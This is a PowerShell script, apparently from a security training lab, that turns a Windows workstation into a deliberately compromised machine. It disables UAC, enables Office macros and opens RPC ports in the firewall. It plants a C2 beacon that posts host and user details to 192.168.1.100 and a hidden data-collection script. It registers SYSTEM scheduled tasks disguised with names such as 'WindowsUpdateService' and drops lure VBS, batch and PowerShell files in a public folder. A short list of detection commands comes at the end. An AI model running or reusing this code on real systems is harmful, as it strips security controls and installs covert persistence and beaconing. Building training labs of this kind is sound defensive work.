# Compromised Windows Workstation Setup Script
# Author: Lab Vuln
# Version: 1.0

# Configuration
$C2Server = "192.168.1.100"
$BeaconInterval = 30
$LogInterval = 5

function Write-ColorOutput {
    param([string]$Message, [string]$Color = "White")
    Write-Host $Message -ForegroundColor $Color
}

function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Install-OfficeMacroVulnerabilities {
    Write-ColorOutput "=== CONFIGURING OFFICE MACRO VULNERABILITIES ===" "Blue"
    
    try {
        # Enable macros in Word
        Write-ColorOutput "Enabling macros in Word..." "Yellow"
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "VBAWarnings" -Value 1 -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1 -ErrorAction SilentlyContinue
        
        # Enable macros in Excel
        Write-ColorOutput "Enabling macros in Excel..." "Yellow"
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings" -Value 1 -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "AccessVBOM" -Value 1 -ErrorAction SilentlyContinue
        
        # Enable macros in PowerPoint
        Write-ColorOutput "Enabling macros in PowerPoint..." "Yellow"
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\PowerPoint\Security" -Name "VBAWarnings" -Value 1 -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\PowerPoint\Security" -Name "AccessVBOM" -Value 1 -ErrorAction SilentlyContinue
        
        # Disable Protected View
        Write-ColorOutput "Disabling Protected View..." "Yellow"
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "VBAWarnings" -Value 1 -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings" -Value 1 -ErrorAction SilentlyContinue
        
        Write-ColorOutput "Office macro vulnerabilities configured!" "Green"
        return $true
    }
    catch {
        Write-ColorOutput "Error configuring Office macros: $($_.Exception.Message)" "Red"
        return $false
    }
}

function Configure-RPCVulnerabilities {
    Write-ColorOutput "=== CONFIGURING RPC VULNERABILITIES ===" "Blue"
    
    try {
        # Enable RPC services
        Write-ColorOutput "Enabling RPC services..." "Yellow"
        Set-Service -Name "RpcSs" -StartupType Automatic
        Set-Service -Name "RpcEptMapper" -StartupType Automatic
        Start-Service -Name "RpcSs" -ErrorAction SilentlyContinue
        Start-Service -Name "RpcEptMapper" -ErrorAction SilentlyContinue
        
        # Configure RPC to allow all connections
        Write-ColorOutput "Configuring RPC to allow all connections..." "Yellow"
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\RpcSs" -Name "Start" -Value 2 -ErrorAction SilentlyContinue
        
        # Disable RPC security
        Write-ColorOutput "Disabling RPC security..." "Yellow"
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\RpcSs\Security" -Name "Security" -Value 0 -ErrorAction SilentlyContinue
        
        # Open RPC ports in firewall
        Write-ColorOutput "Opening RPC ports in firewall..." "Yellow"
        New-NetFirewallRule -DisplayName "RPC-ALL" -Direction Inbound -Protocol TCP -LocalPort 135,49152-65535 -Action Allow -ErrorAction SilentlyContinue
        
        Write-ColorOutput "RPC vulnerabilities configured!" "Green"
        return $true
    }
    catch {
        Write-ColorOutput "Error configuring RPC: $($_.Exception.Message)" "Red"
        return $false
    }
}

function Configure-UACVulnerabilities {
    Write-ColorOutput "=== CONFIGURING UAC VULNERABILITIES ===" "Blue"
    
    try {
        # Disable UAC
        Write-ColorOutput "Disabling UAC..." "Yellow"
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorUser" -Value 0 -ErrorAction SilentlyContinue
        
        # Disable UAC for remote connections
        Write-ColorOutput "Disabling UAC for remote connections..." "Yellow"
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -ErrorAction SilentlyContinue
        
        # Enable auto-elevation
        Write-ColorOutput "Enabling auto-elevation..." "Yellow"
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableInstallerDetection" -Value 0 -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableSecureUIAPaths" -Value 0 -ErrorAction SilentlyContinue
        
        Write-ColorOutput "UAC vulnerabilities configured!" "Green"
        return $true
    }
    catch {
        Write-ColorOutput "Error configuring UAC: $($_.Exception.Message)" "Red"
        return $false
    }
}

function Create-C2Agent {
    Write-ColorOutput "=== CREATING C2 AGENT ===" "Blue"
    
    try {
        # Create C2 beacon script
        Write-ColorOutput "Creating C2 beacon script..." "Yellow"
        $C2Script = @"
# C2 Agent Beacon Script
`$C2Server = "$C2Server"
`$BeaconInterval = $BeaconInterval

while (`$true) {
    try {
        `$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        `$hostname = `$env:COMPUTERNAME
        `$username = `$env:USERNAME
        
        # Collect system information
        `$systemInfo = @{
            Hostname = `$hostname
            Username = `$username
            Timestamp = `$timestamp
            ProcessCount = (Get-Process).Count
            MemoryUsage = [math]::Round((Get-Counter '\Memory\Available MBytes').CounterSamples[0].CookedValue, 2)
        }
        
        # Convert to JSON
        `$jsonData = `$systemInfo | ConvertTo-Json
        
        # Send beacon to C2 server
        `$response = Invoke-WebRequest -Uri "http://`$C2Server/beacon" -Method POST -Body `$jsonData -ContentType "application/json" -UseBasicParsing -ErrorAction SilentlyContinue
        
        if (`$response.StatusCode -eq 200) {
            Write-Host "Beacon sent successfully at `$timestamp" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "Beacon failed at `$timestamp" -ForegroundColor Yellow
    }
    
    Start-Sleep -Seconds `$BeaconInterval
}
"@
        
        Set-Content -Path "C:\Windows\Temp\c2agent.ps1" -Value $C2Script
        
        # Create hidden PowerShell script for data exfiltration
        Write-ColorOutput "Creating hidden data exfiltration script..." "Yellow"
        $HiddenScript = @"
# Hidden Data Exfiltration Script
while (`$true) {
    try {
        # Collect process information
        `$processes = Get-Process | Select-Object Name, Id, CPU, WorkingSet | ConvertTo-Json
        
        # Collect network connections
        `$connections = Get-NetTCPConnection | Where-Object {`$_.State -eq "Listen"} | Select-Object LocalAddress, LocalPort, State | ConvertTo-Json
        
        # Collect user sessions
        `$sessions = quser 2>`$null | ConvertTo-Json
        
        # Save to temporary file
        `$data = @{
            Processes = `$processes
            Connections = `$connections
            Sessions = `$sessions
            Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        }
        
        `$data | ConvertTo-Json | Out-File -FilePath "C:\Windows\Temp\exfil_data.json" -Append
        
        Start-Sleep -Seconds 60
    }
    catch {
        Start-Sleep -Seconds 120
    }
}
"@
        
        Set-Content -Path "C:\Windows\Temp\hidden_exfil.ps1" -Value $HiddenScript
        
        Write-ColorOutput "C2 agent scripts created!" "Green"
        return $true
    }
    catch {
        Write-ColorOutput "Error creating C2 agent: $($_.Exception.Message)" "Red"
        return $false
    }
}

function Create-ScheduledTasks {
    Write-ColorOutput "=== CREATING SCHEDULED TASKS WITH HIDDEN COMMANDS ===" "Blue"
    
    try {
        # Create scheduled task for C2 agent
        Write-ColorOutput "Creating scheduled task for C2 agent..." "Yellow"
        $C2Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\c2agent.ps1"
        $C2Trigger = New-ScheduledTaskTrigger -AtStartup
        Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $C2Action -Trigger $C2Trigger -User "SYSTEM" -RunLevel Highest -ErrorAction SilentlyContinue
        
        # Create scheduled task for data exfiltration
        Write-ColorOutput "Creating scheduled task for data exfiltration..." "Yellow"
        $ExfilAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\hidden_exfil.ps1"
        $ExfilTrigger = New-ScheduledTaskTrigger -AtStartup
        Register-ScheduledTask -TaskName "SystemMaintenance" -Action $ExfilAction -Trigger $ExfilTrigger -User "SYSTEM" -RunLevel Highest -ErrorAction SilentlyContinue
        
        # Create scheduled task for process generation (Event 4688)
        Write-ColorOutput "Creating scheduled task for process generation..." "Yellow"
        $ProcessScript = @"
# Generate Event 4688 (Process Creation)
`$processes = @("notepad.exe", "calc.exe", "mspaint.exe", "cmd.exe", "powershell.exe")
while (`$true) {
    `$randomProcess = `$processes | Get-Random
    try {
        Start-Process -FilePath `$randomProcess -WindowStyle Hidden -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 10
    }
    catch {
        Start-Sleep -Seconds 30
    }
}
"@
        Set-Content -Path "C:\Windows\Temp\process_generator.ps1" -Value $ProcessScript
        
        $ProcessAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\process_generator.ps1"
        $ProcessTrigger = New-ScheduledTaskTrigger -AtStartup
        Register-ScheduledTask -TaskName "SystemMonitor" -Action $ProcessAction -Trigger $ProcessTrigger -User "SYSTEM" -RunLevel Highest -ErrorAction SilentlyContinue
        
        Write-ColorOutput "Scheduled tasks created!" "Green"
        return $true
    }
    catch {
        Write-ColorOutput "Error creating scheduled tasks: $($_.Exception.Message)" "Red"
        return $false
    }
}

function Configure-LogGeneration {
    Write-ColorOutput "=== CONFIGURING LOG GENERATION ===" "Blue"
    
    try {
        # Enable detailed auditing
        Write-ColorOutput "Enabling detailed auditing..." "Yellow"
        auditpol /set /category:"Process Creation" /success:enable /failure:enable
        auditpol /set /category:"Logon" /success:enable /failure:enable
        auditpol /set /category:"Object Access" /success:enable /failure:enable
        auditpol /set /category:"Privilege Use" /success:enable /failure:enable
        
        # Create script to generate Event 4624 (Successful Logon)
        Write-ColorOutput "Creating logon event generator..." "Yellow"
        $LogonScript = @"
# Generate Event 4624 (Successful Logon)
while (`$true) {
    try {
        # Simulate logon events by creating new processes
        `$processes = @("explorer.exe", "svchost.exe", "winlogon.exe")
        `$randomProcess = `$processes | Get-Random
        
        # This will generate logon events
        Start-Process -FilePath `$randomProcess -WindowStyle Hidden -ErrorAction SilentlyContinue
        
        Start-Sleep -Seconds 15
    }
    catch {
        Start-Sleep -Seconds 30
    }
}
"@
        Set-Content -Path "C:\Windows\Temp\logon_generator.ps1" -Value $LogonScript
        
        # Create scheduled task for logon events
        $LogonAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\logon_generator.ps1"
        $LogonTrigger = New-ScheduledTaskTrigger -AtStartup
        Register-ScheduledTask -TaskName "SecurityMonitor" -Action $LogonAction -Trigger $LogonTrigger -User "SYSTEM" -RunLevel Highest -ErrorAction SilentlyContinue
        
        # Create script to modify scheduled tasks (generates Task Scheduler events)
        Write-ColorOutput "Creating task modification script..." "Yellow"
        $TaskModScript = @"
# Generate Task Scheduler modification events
while (`$true) {
    try {
        # Get random task and modify it slightly
        `$tasks = Get-ScheduledTask | Where-Object {`$_.TaskName -like "*System*"}
        if (`$tasks) {
            `$randomTask = `$tasks | Get-Random
            Set-ScheduledTask -TaskName `$randomTask.TaskName -Description "Modified by system"
        }
        
        Start-Sleep -Seconds 45
    }
    catch {
        Start-Sleep -Seconds 60
    }
}
"@
        Set-Content -Path "C:\Windows\Temp\task_modifier.ps1" -Value $TaskModScript
        
        # Create scheduled task for task modifications
        $TaskModAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\task_modifier.ps1"
        $TaskModTrigger = New-ScheduledTaskTrigger -AtStartup
        Register-ScheduledTask -TaskName "TaskScheduler" -Action $TaskModAction -Trigger $TaskModTrigger -User "SYSTEM" -RunLevel Highest -ErrorAction SilentlyContinue
        
        Write-ColorOutput "Log generation configured!" "Green"
        return $true
    }
    catch {
        Write-ColorOutput "Error configuring log generation: $($_.Exception.Message)" "Red"
        return $false
    }
}

function Create-MaliciousDocuments {
    Write-ColorOutput "=== CREATING MALICIOUS DOCUMENTS ===" "Blue"
    
    try {
        # Create directory for malicious documents
        $DocDir = "C:\Users\Public\Documents\Reports"
        New-Item -ItemType Directory -Path $DocDir -Force -ErrorAction SilentlyContinue
        
        # Create VBS script for document execution
        Write-ColorOutput "Creating VBS execution script..." "Yellow"
        $VBScript = @"
' Malicious VBS Script
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\hidden_exfil.ps1", 0, False
"@
        Set-Content -Path "$DocDir\update.vbs" -Value $VBScript
        
        # Create batch file for execution
        Write-ColorOutput "Creating batch execution file..." "Yellow"
        $BatchScript = @"
@echo off
REM Hidden batch execution
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'C:\Windows\Temp\c2agent.ps1' -WindowStyle Hidden"
"@
        Set-Content -Path "$DocDir\system_update.bat" -Value $BatchScript
        
        # Create PowerShell script disguised as document
        Write-ColorOutput "Creating disguised PowerShell script..." "Yellow"
        $DisguisedScript = @"
# Disguised as document but actually PowerShell
# This script will be executed when opened
Write-Host "Loading document..." -ForegroundColor Green
Start-Sleep -Seconds 2

# Execute hidden PowerShell script
Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\hidden_exfil.ps1" -WindowStyle Hidden

Write-Host "Document loaded successfully!" -ForegroundColor Green
"@
        Set-Content -Path "$DocDir\report.ps1" -Value $DisguisedScript
        
        Write-ColorOutput "Malicious documents created in $DocDir" "Green"
        return $true
    }
    catch {
        Write-ColorOutput "Error creating malicious documents: $($_.Exception.Message)" "Red"
        return $false
    }
}

function Create-Documentation {
    Write-ColorOutput "=== CREATING DOCUMENTATION ===" "Blue"
    
    try {
        $DocContent = @"
# COMPROMISED WINDOWS WORKSTATION - Machine 1

## Configuration
- C2 Server: $C2Server
- Beacon Interval: $BeaconInterval seconds
- Log Generation Interval: $LogInterval seconds

## Implemented Vulnerabilities

### A) Office Macro Vulnerabilities
- Macros enabled in Word, Excel, PowerPoint
- Protected View disabled
- VBA access enabled

### B) RPC Vulnerabilities
- RPC services enabled and exposed
- RPC security disabled
- Firewall rules opened for RPC ports

### C) UAC Misconfiguration
- UAC completely disabled
- Auto-elevation enabled
- Remote UAC bypass enabled

## Noise Generation

### C2 Agent
- Continuous beaconing to $C2Server
- System information collection
- Hidden PowerShell execution

### Hidden PowerShell Scripts
- Data exfiltration script: C:\Windows\Temp\hidden_exfil.ps1
- Process generation script: C:\Windows\Temp\process_generator.ps1
- Logon event generator: C:\Windows\Temp\logon_generator.ps1

### Scheduled Tasks
- WindowsUpdateService: C2 agent
- SystemMaintenance: Data exfiltration
- SystemMonitor: Process generation
- SecurityMonitor: Logon events
- TaskScheduler: Task modifications

## Log Generation

### Event 4688 (Process Creation)
- Continuous process creation events
- Random processes: notepad.exe, calc.exe, mspaint.exe, cmd.exe, powershell.exe

### Event 4624 (Successful Logon)
- Frequent logon events
- Generated by process creation

### Task Scheduler Changes
- Continuous task modifications
- Scheduled task updates

## Malicious Documents
- Location: C:\Users\Public\Documents\Reports\
- update.vbs: VBS execution script
- system_update.bat: Batch execution
- report.ps1: Disguised PowerShell script

## Detection Commands

### Check C2 Activity
- Get-Process | Where-Object {`$_.ProcessName -eq "powershell"}
- Get-NetTCPConnection | Where-Object {`$_.RemoteAddress -eq "$C2Server"}

### Check Scheduled Tasks
- Get-ScheduledTask | Where-Object {`$_.TaskName -like "*System*"}

### Check Event Logs
- Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} -MaxEvents 10
- Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -MaxEvents 10

### Check Vulnerabilities
- Get-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security"
- Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
- Get-Service -Name RpcSs, RpcEptMapper

Created: $(Get-Date)
"@
        
        Set-Content -Path "C:\Machine1-Info.txt" -Value $DocContent
        Write-ColorOutput "Documentation created in C:\Machine1-Info.txt" "Green"
        return $true
    }
    catch {
        Write-ColorOutput "Error creating documentation: $($_.Exception.Message)" "Red"
        return $false
    }
}

function Show-Summary {
    Write-ColorOutput "`n=== COMPROMISED WORKSTATION SETUP SUMMARY ===" "Blue"
    Write-ColorOutput "✅ Office macro vulnerabilities configured" "Green"
    Write-ColorOutput "✅ RPC vulnerabilities configured" "Green"
    Write-ColorOutput "✅ UAC misconfiguration applied" "Green"
    Write-ColorOutput "✅ C2 agent created" "Green"
    Write-ColorOutput "✅ Hidden PowerShell scripts deployed" "Green"
    Write-ColorOutput "✅ Scheduled tasks with hidden commands created" "Green"
    Write-ColorOutput "✅ Continuous log generation configured" "Green"
    Write-ColorOutput "✅ Malicious documents created" "Green"
    Write-ColorOutput "✅ Documentation created" "Green"
    
    Write-ColorOutput "`n=== IMPORTANT INFORMATION ===" "Yellow"
    Write-ColorOutput "C2 Server: $C2Server" "Yellow"
    Write-ColorOutput "Beacon Interval: $BeaconInterval seconds" "Yellow"
    Write-ColorOutput "Documentation: C:\Machine1-Info.txt" "Yellow"
    Write-ColorOutput "Scripts Location: C:\Windows\Temp\" "Yellow"
    Write-ColorOutput "Documents Location: C:\Users\Public\Documents\Reports\" "Yellow"
    
    Write-ColorOutput "`n=== NEXT STEPS ===" "Blue"
    Write-ColorOutput "1. Restart the workstation" "Yellow"
    Write-ColorOutput "2. Verify C2 connectivity" "Yellow"
    Write-ColorOutput "3. Monitor event logs" "Yellow"
    Write-ColorOutput "4. Test malicious documents" "Yellow"
    Write-ColorOutput "5. Verify scheduled tasks are running" "Yellow"
    
    Write-ColorOutput "`n⚠️  COMPROMISED WORKSTATION CONFIGURED SUCCESSFULLY! ⚠️" "Red"
}

# MAIN FUNCTION
function Setup-CompromisedWorkstation {
    Write-ColorOutput "=== COMPROMISED WINDOWS WORKSTATION SETUP ===" "Blue"
    Write-ColorOutput "Lab Vuln - Security Training Environment" "Blue"
    Write-ColorOutput "Version: 1.0" "Blue"
    Write-ColorOutput "Date: $(Get-Date)" "Blue"
    
    # Check if running as administrator
    if (!(Test-Administrator)) {
        Write-ColorOutput "ERROR: This script must be run as Administrator!" "Red"
        return
    }
    
    Write-ColorOutput "`nSetting up compromised Windows workstation..." "Yellow"
    Write-ColorOutput "⚠️  WARNING: This will create an intentionally vulnerable environment!" "Red"
    
    $continue = Read-Host "`nDo you want to continue? (Y/N)"
    if ($continue -ne "Y" -and $continue -ne "y") {
        Write-ColorOutput "Setup cancelled by user." "Yellow"
        return
    }
    
    # Execute setup steps
    $steps = @(
        @{Name = "Office Macro Vulnerabilities"; Function = "Install-OfficeMacroVulnerabilities"},
        @{Name = "RPC Vulnerabilities"; Function = "Configure-RPCVulnerabilities"},
        @{Name = "UAC Misconfiguration"; Function = "Configure-UACVulnerabilities"},
        @{Name = "C2 Agent"; Function = "Create-C2Agent"},
        @{Name = "Scheduled Tasks"; Function = "Create-ScheduledTasks"},
        @{Name = "Log Generation"; Function = "Configure-LogGeneration"},
        @{Name = "Malicious Documents"; Function = "Create-MaliciousDocuments"},
        @{Name = "Documentation"; Function = "Create-Documentation"}
    )
    
    foreach ($step in $steps) {
        Write-ColorOutput "`nExecuting: $($step.Name)" "Blue"
        & $step.Function
        
        if ($LASTEXITCODE -ne 0) {
            Write-ColorOutput "Error in step: $($step.Name)" "Red"
            return
        }
    }
    
    Show-Summary
}

# Execute setup
Setup-CompromisedWorkstation 